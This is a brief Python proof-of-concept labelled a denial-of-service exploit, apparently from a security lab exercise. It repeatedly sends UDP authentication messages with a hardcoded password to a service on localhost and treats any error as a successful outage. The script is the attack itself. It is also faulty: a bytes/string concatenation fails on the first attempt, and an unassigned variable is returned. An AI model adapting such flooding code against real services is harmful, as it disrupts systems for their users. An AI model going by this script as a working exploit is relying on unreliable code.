#Vulnerability Name - Denial of Service
import socket
import random
import string

def CleartextAuthenticate(p) :
    dosAchieved = False
    i=0
    while dosAchieved == False:
        try:
            print("attempt: " + str(i))
            s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
            s.sendto(b"AUTH " + "!Q#E%T&U8i6y4r2w", ("127.0.0.1", p))
            token, addr = s.recvfrom(1024)
            i +=1

        except Exception as e:
            dosAchieved = True

    return token

try:
    
    infPort = 23456
    incPort = 23457
    incToken = CleartextAuthenticate(incPort)
    assert(incToken != None)
except Exception as ex:
    print (ex)